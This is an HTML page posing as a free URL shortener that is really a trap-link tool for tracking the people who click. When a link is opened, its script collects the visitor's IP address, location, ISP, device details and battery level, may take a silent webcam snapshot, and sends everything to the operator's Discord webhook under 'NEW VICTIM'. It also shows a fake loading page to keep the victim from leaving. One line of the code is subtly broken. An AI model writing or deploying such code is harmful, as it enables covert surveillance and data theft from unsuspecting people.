<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ShrinkLink – Free URL Shortener</title>
  <style>
    :root { --bg: #0d0d0d; --fg: #00ff41; --acc: #00ff41; }
    [data-theme="dark"] { --bg: #0d0d0d; --fg: #00ff41; --acc: #00ff41; }
    body { margin:0; font-family: 'Courier New'; background:var(--bg); color:var(--fg); padding:20px; }
    .card { background:#111; border:1px solid var(--acc); border-radius:12px; padding:20px; max-width:800px; margin:auto; box-shadow:0 0 20px #00ff4120; }
    input, button { padding:12px; margin:8px 0; width:100%; border:1px solid var(--acc); background:#000; color:var(--fg); border-radius:8px; font-size:1rem; }
    button { background:var(--acc); color:#000; cursor:pointer; font-weight:bold; transition:0.3s; }
    button:hover { background:#00cc33; }
    #generated { word-break:break-all; background:#000; padding:15px; border-radius:8px; margin:15px 0; }
    #logs { margin-top:30px; }
    .log { background:#000; padding:10px; margin:5px 0; border-left:4px solid var(--acc); font-size:0.9rem; }
    .cam { width:120px; border:2px solid var(--acc); border-radius:8px; }
    .footer { text-align:center; margin-top:50px; font-size:0.8rem; opacity:0.6; }
  </style>
</head>
<body>
  <div class="card">
    <h1>ShrinkLink <span style="font-size:0.6em">⚡</span></h1>
    <p>Shorten any link. Track every click. Zero ads.</p>

    <input id="target" placeholder="https://youtube.com/watch?v=rickroll" />
    <input id="webhook" placeholder="Discord webhook URL (kept private)" />
    <label><input type="checkbox" id="cam" /> Steal webcam snapshot (silent)</label>
    <button onclick="generate()">GENERATE TRAP LINK</button>

    <div id="generated" style="display:none">
      <strong>Your trap:</strong><br>
      <a id="shortlink" href="#" target="_blank"></a>
      <button onclick="copy()" style="width:auto;padding:8px 15px;margin-top:10px;">Copy</button>
    </div>

    <div id="logs">
      <h2>Live Logs <span id="count">0</span></h2>
      <button onclick="clearLogs()" style="width:auto;padding:8px 15px;">Clear</button>
      <div id="logbox"></div>
    </div>
  </div>

  <div class="footer">© 2025 ShrinkLink – For educational purposes only 😉</div>

  <script>
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    let logs = JSON.parse(localStorage.getItem("ratlogs") || "[]");
    renderLogs();

    function randId() {
      let id = "";
      for(let i=0;i<8;i++) id += chars[Math.floor(Math.random()*chars.length)];
      return id;
    }

    async function generate() {
      const target = document.getElementById("target").value.trim();
      const webhook = document.getElementById("webhook").value.trim();
      const cam = document.getElementById("cam").checked;

      if (!target || !webhook) return alert("Fill both boxes, boss.");

      const id = randId();
      const short = `${location.origin}/r/${id}`;
      
      // Store trap config
      localStorage.setItem(`trap_${id}`, JSON.stringify({target, webhook, cam}));

      document.getElementById("shortlink").href = short;
      document.getElementById("shortlink").innerText = short;
      document.getElementById("generated").style.display = "block";
    }

    function copy() {
      navigator.clipboard.writeText(document.getElementById("shortlink").href);
      alert("Copied to clipboard. Go fish.");
    }

    // === LOG RENDER ===
    function renderLogs() {
      const box = document.getElementById("logbox");
      box.innerHTML = "";
      logs.forEach(l => {
        const div = document.createElement("div");
        div.className = "log";
        div.innerHTML = `
          <strong>${l.time}</strong> 👤 ${l.ip} (${l.city}, ${l.country})<br>
          🎯 <a href="${l.target}" target="_blank">${l.target.slice(0,40)}...</a><br>
          🌐 ${l.ua}<br>
          ${l.cam ? `<img class="cam" src="${l.cam}" />` : ""}
        `;
        box.prepend(div);
      });
      document.getElementById("count").innerText = logs.length;
    }

    function clearLogs() {
      logs = [];
      localStorage.setItem("ratlogs", "[]");
      renderLogs();
    }

    // === CATCH CLICKS (the /r/ trap) ===
    if (location.pathname.startsWith("/r/")) {
      const id = location.pathname.slice(3);
      const config = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
      if (!config.target) {
        document.body.innerHTML = "<h1>404 – Link expired.</h1>";
      } else {
        (async () => {
          // Grab everything
          const ipData = await (await fetch("https://ipapi.co/json/")).json();
          const ua = navigator.userAgent;
          const camSnap = config.cam ? await grabCam() : null;

          const payload = {
            content: "**NEW VICTIM**",
            embeds: [{
              title: "Click Tracked",
              color: 0x00ff41,
              fields: [
                {name:"IP", value: ipData.ip, inline:true},
                {name:"Location", value: `${ipData.city}, ${ipData.country_name}`, inline:true},
                {name:"ISP", value: ipData.org, inline:true},
                {name:"Device", value: ua.slice(0,80), inline:false},
                {name:"Screen", value: `${screen.width}x${screen.height}`, inline:true},
                {name:"Battery", value: (await navigator.getBattery()).level*100 + "%", inline:true},
                {name:"Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true},
                {name:"Redirect", value: config.target, inline:false}
              ],
              thumbnail: {url: camSnap || "https://i.imgur.com/removed.png"},
              timestamp: new Date().toISOString()
            }]
          };

          // Send to webhook
          fetch(config.webhook, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload)
          });

          // Save to boss panel
          const log = {
            time: new Date().toLocaleString(),
            ip: ipData.ip,
            city: ipData.city,
            country: ipData.country_name,
            ua,
            target: config.target,
            cam: camSnap
          };
          const all = JSON.parse(localStorage.getItem("ratlogs") || "[]");
          all.push(log);
          localStorage.setItem("ratlogs", JSON.stringify(all));

          // Redirect victim
          setTimeout(() => location.href = config.target, 500);
        })();
      }

      async function grabCam() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({video:true});
          const vid = document.createElement("video");
          vid.srcOb`ject = stream;
          vid.play();
          await new Promise(r => setTimeout(r, 1000));
          const canvas = document.createElement("canvas");
          canvas.width = 320; canvas.height = 240;
          canvas.getContext("2d").drawImage(vid,0,0,320,240);
          stream.getTracks().forEach(t=>t.stop());
          return canvas.toDataURL("image/jpeg",0.8);
        } catch(e) { return null; }
      }

      // Fake loading page so victim doesn’t bail
      document.body.innerHTML = `<div style="text-align:center;margin-top:100px;color:#00ff41;font-family:Courier">
        <h1>Loading your link...</h1><p>Please wait 3 seconds</p>
        <img src="https://i.imgur.com/removed.png" width="60" />
      </div>`;
    }
  </script>
</body>
</html>
